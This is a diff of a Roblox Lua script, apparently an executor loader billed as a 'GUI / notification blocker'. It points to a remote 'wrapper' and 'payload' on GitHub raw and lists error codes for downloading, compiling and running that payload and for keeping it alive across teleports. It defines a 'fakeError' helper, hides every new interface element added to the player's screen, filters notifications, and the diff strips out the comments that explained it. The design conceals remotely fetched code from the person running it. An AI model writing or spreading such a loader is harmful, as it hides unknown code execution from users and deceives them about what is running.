@@ -1,19 +1,8 @@
---// TELEPORT-PERSISTENT GUI / NOTIFICATION BLOCKER
---// Error 1 = failed to download wrapper/payload
---// Error 2 = failed to compile payload
---// Error 3 = payload runtime error
---// Error 4 = queue_on_teleport unavailable
 
-------------------------------------------------------------
--- CONFIG
-------------------------------------------------------------
 
 local WRAPPER_URL = "https://raw.githubusercontent.com/ExclusiveVersionGithubIsLoaded/CrownSoftworks/refs/heads/main/wrp.lua"
 local PAYLOAD_URL = "https://raw.githubusercontent.com/ExclusiveVersionGithubIsLoaded/CrownSoftworks/refs/heads/main/drbf.lua"
 
-------------------------------------------------------------
--- SERVICES
-------------------------------------------------------------
 
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
@@ -22,9 +11,6 @@ local StarterGui = game:GetService("StarterGui")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
-------------------------------------------------------------
--- GLOBAL STATE
-------------------------------------------------------------
 
 local ENV = getgenv()
 
@@ -34,17 +20,11 @@ end
 
 ENV.__GUI_WRAPPER_RUNNING = true
 
-------------------------------------------------------------
--- FAKE ERRORS
-------------------------------------------------------------
 
 local function fakeError(code)
     warn("error " .. tostring(code))
 end
 
-------------------------------------------------------------
--- GUI SETTINGS
-------------------------------------------------------------
 
 local HIDE_TEXT = true
 local HIDE_IMAGES = true
@@ -52,9 +32,7 @@ local HIDE_FRAMES = true
 local HIDE_STROKES = true
 local HIDE_SCROLLBARS = true
 
-------------------------------------------------------------
--- EXISTING OBJECTS
-------------------------------------------------------------
+
 
 local Existing = {}
 
@@ -66,13 +44,11 @@ local function rememberTree(root)
     end
 end
 
--- Existing game UI is considered safe.
+
 rememberTree(PlayerGui)
 rememberTree(CoreGui)
 
-------------------------------------------------------------
--- HIDE OBJECT
-------------------------------------------------------------
+
 
 local function hideObject(obj)
 
@@ -80,9 +56,7 @@ local function hideObject(obj)
         return
     end
 
-    --------------------------------------------------------
-    -- SCREEN GUI
-    --------------------------------------------------------
+
 
     if obj:IsA("ScreenGui") then
 
@@ -93,9 +67,7 @@ local function hideObject(obj)
         return
     end
 
-    --------------------------------------------------------
-    -- GUI OBJECT
-    --------------------------------------------------------
+
 
     if HIDE_FRAMES and obj:IsA("GuiObject") then
 
@@ -105,9 +77,6 @@ local function hideObject(obj)
 
     end
 
-    --------------------------------------------------------
-    -- TEXT
-    --------------------------------------------------------
 
     if HIDE_TEXT and (
         obj:IsA("TextLabel")
@@ -125,9 +94,6 @@ local function hideObject(obj)
 
     end
 
-    --------------------------------------------------------
-    -- IMAGES
-    --------------------------------------------------------
 
     if HIDE_IMAGES and (
         obj:IsA("ImageLabel")
@@ -140,9 +106,6 @@ local function hideObject(obj)
 
     end
 
-    --------------------------------------------------------
-    -- UI STROKE
-    --------------------------------------------------------
 
     if HIDE_STROKES and obj:IsA("UIStroke") then
 
@@ -152,9 +115,7 @@ local function hideObject(obj)
 
     end
 
-    --------------------------------------------------------
-    -- SCROLL BAR
-    --------------------------------------------------------
+
 
     if HIDE_SCROLLBARS and obj:IsA("ScrollingFrame") then
 
@@ -164,9 +125,7 @@ local function hideObject(obj)
 
     end
 
-    --------------------------------------------------------
-    -- VIEWPORT
-    --------------------------------------------------------
+
 
     if obj:IsA("ViewportFrame") then
 
@@ -177,9 +136,7 @@ local function hideObject(obj)
     end
 end
 
-------------------------------------------------------------
--- HIDE TREE
-------------------------------------------------------------
+
 
 local function hideTree(root)
 
@@ -194,9 +151,6 @@ local function hideTree(root)
     end
 end
 
-------------------------------------------------------------
--- NEW PLAYERGUI OBJECT
-------------------------------------------------------------
 
 local function processNewObject(obj)
 
@@ -213,9 +167,7 @@ local function processNewObject(obj)
     end
 end
 
-------------------------------------------------------------
--- PLAYERGUI WATCHER
-------------------------------------------------------------
+
 
 PlayerGui.DescendantAdded:Connect(function(obj)
 
@@ -225,23 +177,7 @@ PlayerGui.DescendantAdded:Connect(function(obj)
 
 end)
 
-------------------------------------------------------------
--- IMPORTANT
---
--- CoreGui is NOT globally watched.
---
--- This protects:
--- • Roblox achievements
--- • Roblox notifications
--- • chat
--- • topbar
--- • system UI
--- • game-created CoreGui
-------------------------------------------------------------
 
-------------------------------------------------------------
--- NOTIFICATION FILTER
-------------------------------------------------------------
 
 local function shouldBlockNotification(args)
 
